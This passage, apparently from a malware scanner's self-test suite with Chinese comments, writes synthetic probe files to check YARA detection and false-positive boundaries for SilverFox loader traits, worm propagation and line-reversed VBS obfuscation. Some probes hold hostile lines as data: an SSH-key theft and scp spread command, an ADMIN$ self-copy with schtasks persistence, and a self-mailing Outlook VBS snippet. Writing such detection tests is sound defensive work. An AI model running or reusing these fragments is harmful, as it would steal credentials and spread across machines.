                  next((fd["name"] for fd in fds_ab
                        if fd["name"].startswith("SilverFox")), ""))

            # 31e) 公共目录 + 随机名可执行 → StageDrop_Public
            # （随机名每批变，公共目录投递结构不变）
            p_sd = gen_dir / "stage_drop.bin"
            p_sd.write_bytes(b"MZ" + b"\x90" * 30
                             + b"C:\\Users\\Public\\nT4mR9\\aB3xK7.exe")
            fds_sd = scan_file(p_sd, db, ctx_g)
            check("银狐泛化层: 公共目录投递结构检出",
                  any(fd["name"] == "SilverFox_StageDrop_Public"
                      for fd in fds_sd),
                  next((fd["name"] for fd in fds_sd
                        if fd["name"].startswith("SilverFox")), ""))

            # 31f) 合法远控本体（品牌串、无执行编排代码）不误报
            p_ras = gen_dir / "benign_rat.bin"
            p_ras.write_bytes(b"MZ" + b"\x90" * 40
                              + b"AweSun Remote Assistance"
                              + b" SunloginClient setup")
            fds_ras = scan_file(p_ras, db, ctx_g)
            check("银狐泛化层: 合法远控本体不误报",
                  not any(fd["name"].startswith("SilverFox") for fd in fds_ras),
                  f"检出={[fd['name'] for fd in fds_ras
                              if fd['name'].startswith('SilverFox')]}")

            # 31g) 分析报告文本（泛化特征串齐备、无 MZ/OLE 门）不误报
            p_rep3 = gen_dir / "gen_report.txt"
            p_rep3.write_text(
                "报告：样本使用 MonKeyDu 厂商属性、SuspendThread/SetThreadContext/"
                "ResumeThread/VirtualAlloc 注入、oss-cn-hangzhou.aliyuncs.com C2、"
                "Users\\Public 投递、schtasks 持久化。\n", encoding="utf-8")
            fds_rep3 = scan_file(p_rep3, db, ctx_g)
            check("银狐泛化层: 分析报告文本不误报",
                  not any(fd["name"].startswith("SilverFox") for fd in fds_rep3),
                  f"检出={[fd['name'] for fd in fds_rep3
                              if fd['name'].startswith('SilverFox')]}")
        else:
            for nm in ("银狐泛化层: MSI 生成器指纹检出",
                       "银狐泛化层: 线程上下文注入 API 组合检出",
                       "银狐泛化层: OSS 托管+投递双锚检出",
                       "银狐泛化层: 远控滥用模式检出",
                       "银狐泛化层: 公共目录投递结构检出",
                       "银狐泛化层: 合法远控本体不误报",
                       "银狐泛化层: 分析报告文本不误报"):
                check(nm, True, "（未安装 yara-python，跳过）")
    except Exception as exc:
        check("银狐多态泛化层", False, f"异常: {exc}")

    # ==================== 第 32 组：蠕虫检测规则草案 ====================
    # worms.yar 三条传播结构规则（SSH 凭证横移 / SMB 共享传播 / 邮件自群发）
    # 的命中与误报边界验证，全部使用合成探针。
    try:
        if _gen_has_yara:
            worm_dir = sample_dir / "worm_probes"
            worm_dir.mkdir(exist_ok=True)
            ctx_w = ScanContext(rules_paths=rules)

            p_ssh = worm_dir / "ssh_worm.sh"
            p_ssh.write_text(
                "tar czf /tmp/.x.tgz ~/.ssh/id_rsa; cat /tmp/.k.pub "
                ">> ~/.ssh/authorized_keys; scp -oStrictHostKeyChecking=no "
                "/tmp/.x.tgz root@$next:/tmp/", encoding="utf-8")
            h_ssh = [fd["name"] for fd in scan_file(p_ssh, db, ctx_w)]
            check("蠕虫规则: SSH 凭证横移检出",
                  "Worm_SSH_Propagation" in h_ssh, f"{h_ssh}")

            p_smb = worm_dir / "smb_worm.bin"
            p_smb.write_bytes(b"MZ" + b"\x90" * 60
                              + b"copy self to \\\\ADMIN$\\system32.exe "
                              + b"then schtasks /create /sc onstart"
                              + b" /tn Updater /tr \\\\ADMIN$\\system32.exe")
            h_smb = [fd["name"] for fd in scan_file(p_smb, db, ctx_w)]
            check("蠕虫规则: SMB 共享传播检出",
                  "Worm_Share_Propagation" in h_smb, f"{h_smb}")

            p_mail = worm_dir / "mail_worm.vbs"
            p_mail.write_text(
                'Set o = CreateObject("Outlook.Application")\n'
                "Set m = o.CreateItem(0)\n"
                "m.Attachments.Add WScript.ScriptFullName\nm.Send",
                encoding="utf-8")
            h_mail = [fd["name"] for fd in scan_file(p_mail, db, ctx_w)]
            check("蠕虫规则: 邮件自群发检出",
                  "Worm_Email_Script" in h_mail, f"{h_mail}")

            p_ans = worm_dir / "ansible.yml"
            p_ans.write_text(
                "- name: deploy key\n  copy: src=keys/ops.pub "
                "dest=/home/ops/.ssh/authorized_keys mode=0644",
                encoding="utf-8")
            h_ans = [fd["name"] for fd in scan_file(p_ans, db, ctx_w)]
            check("蠕虫规则: 配置管理不误报",
                  not any(h.startswith("Worm_") for h in h_ans), f"{h_ans}")

            p_ops = worm_dir / "ops_task.txt"
            p_ops.write_text(
                "schtasks /create /sc daily /tn Backup /tr C:\\backup\\run.cmd",
                encoding="utf-8")
            h_ops = [fd["name"] for fd in scan_file(p_ops, db, ctx_w)]
            check("蠕虫规则: 运维脚本不误报",
                  not any(h.startswith("Worm_") for h in h_ops), f"{h_ops}")

            p_rep = worm_dir / "worm_report.txt"
            p_rep.write_text(
                "报告：蠕虫读取 id_rsa，写入 authorized_keys，使用 "
                "Outlook.Application 群发，投递 \\\\ADMIN$ 并 schtasks 持久化。\n",
                encoding="utf-8")
            h_rep = [fd["name"] for fd in scan_file(p_rep, db, ctx_w)]
            check("蠕虫规则: 报告文本不误报",
                  not any(h.startswith("Worm_") for h in h_rep), f"{h_rep}")
        else:
            for nm in ("蠕虫规则: SSH 凭证横移检出",
                       "蠕虫规则: SMB 共享传播检出",
                       "蠕虫规则: 邮件自群发检出",
                       "蠕虫规则: 配置管理不误报",
                       "蠕虫规则: 运维脚本不误报",
                       "蠕虫规则: 报告文本不误报"):
                check(nm, True, "（未安装 yara-python，跳过）")
    except Exception as exc:
        check("蠕虫检测规则草案", False, f"异常: {exc}")

    # ==================== 第 33 组：暴风一号反转混淆反制 ====================
    # 行反转混淆 VBS 蠕虫（Storm1）：明文锚失效，锚定反转形态双串。
    # 合成探针复刻混淆形态，绝不触碰真实样本文件。
    try:
        if _gen_has_yara:
            st_dir = sample_dir / "storm1_probes"
            st_dir.mkdir(exist_ok=True)
            ctx_s = ScanContext(rules_paths=rules)

            # 33a) 反转形态双锚合成探针 → Worm_VBS_Storm1
            p_st = st_dir / "storm1_like.vbs"
            p_st.write_text(
                "'eniFyoB.9-_-  :haey oG\n"
                "'suriVniaMteG = sutisVniaMteG\n"
                "WScript.Echo \"demo\"\n", encoding="utf-8")
            h_st = [fd["name"] for fd in scan_file(p_st, db, ctx_s)]
            check("Storm1: 反转形态探针检出",
                  "Worm_VBS_Storm1" in h_st, f"{h_st}")

            # 33b) 正序分析报告文本（含正序函数名/署名）零误报
            p_str = st_dir / "storm1_report.txt"
            p_str.write_text(
                "报告：暴风一号 VBS 蠕虫采用整行字符反转混淆，核心函数 "
                "GetMainVirus 与作者署名 9-_-BoyFine 在原文中均以反转形态"
                "存在，明文特征串全部失效。\n", encoding="utf-8")
            h_str = [fd["name"] for fd in scan_file(p_str, db, ctx_s)]
            check("Storm1: 分析报告文本零误报",
                  not any(fd["name"] == "Worm_VBS_Storm1" for fd in
                          scan_file(p_str, db, ctx_s)), f"{h_str}")

            # 33c) 普通良性 VBS 零误报
            p_stb = st_dir / "benign.vbs"
            p_stb.write_text(
                "Set sh = CreateObject(\"WScript.Shell\")\n"
                "sh.Popup \"hello\", 1\n", encoding="utf-8")
            h_stb = [fd["name"] for fd in scan_file(p_stb, db, ctx_s)]
            check("Storm1: 良性 VBS 零误报",
                  not any(fd["name"] == "Worm_VBS_Storm1" for fd in
                          scan_file(p_stb, db, ctx_s)), f"{h_stb}")
        else:
            for nm in ("Storm1: 反转形态探针检出",
                       "Storm1: 分析报告文本零误报",
                       "Storm1: 良性 VBS 零误报"):
                check(nm, True, "（未安装 yara-python，跳过）")
    except Exception as exc:
        check("暴风一号反转混淆反制", False, f"异常: {exc}")

    # ==================== 第 34 组：deobf 行反转层 ====================
    # 行反转混淆（Storm-1 型）接入 deobf 链：还原文本经 content_findings
    # 复扫命中模式签名；正常脚本不误触发 line-reverse 变换。
    try:
        # 34a) 反转混淆探针 → 还原后复扫命中 AJiaSu 投递链 pattern
        payload_lines = [
            "Set ws = CreateObject(\"WScript.Shell\")",
            "Call ws.Run(\"AJiaSu_4.9.5.0.exe\")",
            "If ok Then okmore",
            "Next step loops",
            "Sub MainEnd()",
        ]
        p_rev = sample_dir / "storm1_rev_probe.txt"
        p_rev.write_text("\n".join(ln[::-1] for ln in payload_lines) + "\n",
                         encoding="utf-8")
        fds_rev = [fd for fd in scan_file(p_rev, db, ctx_g if _gen_has_yara
                                          else ScanContext())
                   if "line-reverse" in fd.get("detail", "")]
        check("deobf 行反转: 混淆探针还原检出",
              bool(fds_rev),
              f"{[(fd['name'], fd['detail'][:60]) for fd in fds_rev]}")

        # 34b) 正常正序脚本不误触发 line-reverse
        p_norm = sample_dir / "normal_script.txt"
        p_norm.write_text(
            "Set ws = CreateObject(\"WScript.Shell\")\n"
            "Call ws.Run(\"notepad.exe\")\n"
            "If ok Then okmore\n"
            "Next step loops\n"
            "Sub MainEnd()\n", encoding="utf-8")
        fds_norm = [fd for fd in scan_file(p_norm, db, ScanContext())
                    if "line-reverse" in fd.get("detail", "")]
        check("deobf 行反转: 正常脚本零误触发",
              not fds_norm, f"{fds_norm}")
    except Exception as exc:
        check("deobf 行反转层", False, f"异常: {exc}")

    # ==================== 第 35 组：联网扫描便携配置（vt_config.json）====================
    # 其他设备免环境变量：Key/代理从 exe 同目录 vt_config.json 读取；
    # 环境变量优先；损坏配置容错；代理 opener 正确注入。
    try:
        from . import vt as vt_mod
        cfg_path = sample_dir / "vt_config_test.json"
        cfg_path.write_text(
            '{"api_key": "cfgkey123", "proxy": "http://127.0.0.1:7890"}',
            encoding="utf-8")
        old_cfg = vt_mod.VT_CONFIG
        vt_mod.VT_CONFIG = cfg_path
        had_env = "VT_API_KEY" in os.environ
        saved_env = os.environ.pop("VT_API_KEY", None)
        try:
            # 35a) 配置文件 Key/代理解析（无环境变量时）
            c1 = vt_mod.VTClient()
            check("vt 便携配置: 配置文件 Key 解析",
                  c1.api_key == "cfgkey123", f"api_key={c1.api_key!r}")
            check("vt 便携配置: 代理解析",
                  c1.proxy == "http://127.0.0.1:7890", f"proxy={c1.proxy!r}")
            check("vt 便携配置: has_key() 识别配置文件",
                  vt_mod.VTClient.has_key(), "")

            # 35b) 环境变量优先于配置文件
            os.environ["VT_API_KEY"] = "envkey999"
            c2 = vt_mod.VTClient()
            check("vt 便携配置: 环境变量优先",
                  c2.api_key == "envkey999", f"api_key={c2.api_key!r}")
            del os.environ["VT_API_KEY"]

            # 35c) 代理 opener 注入（显式代理覆盖默认 ProxyHandler）
            ops = c1._build_opener()
            phs = [getattr(h, "proxies", {}) for h in ops.handlers
                   if type(h).__name__ == "ProxyHandler"]
            check("vt 便携配置: 代理 opener 注入",
                  any(p.get("https") == "http://127.0.0.1:7890" for p in phs),
                  f"proxies={phs}")
            c_bare = vt_mod.VTClient(api_key="k", proxy="")
            phs2 = [getattr(h, "proxies", {}) for h in
                    c_bare._build_opener().handlers
                    if type(h).__name__ == "ProxyHandler"]
            check("vt 便携配置: 无代理不注入配置值",
                  all(p.get("https") != "http://127.0.0.1:7890" for p in phs2),
                  f"proxies={phs2}")

            # 35d) 损坏配置容错（返回空配置，不抛异常）
            cfg_path.write_text("not json {{{", encoding="utf-8")
            c3 = vt_mod.VTClient(api_key="k")
            check("vt 便携配置: 损坏配置容错",
                  c3.api_key == "k" and c3.proxy == "",
                  f"api_key={c3.api_key!r} proxy={c3.proxy!r}")
        finally:
            vt_mod.VT_CONFIG = old_cfg
            os.environ.pop("VT_API_KEY", None)
            if had_env:
                os.environ["VT_API_KEY"] = saved_env
    except Exception as exc:
        check("vt 便携配置组", False, f"异常: {exc}")

    ok_all = all(results)
    print(f"\n[i] 自检{'全部通过' if ok_all else '存在失败项'}。")
    return 0 if ok_all else 1
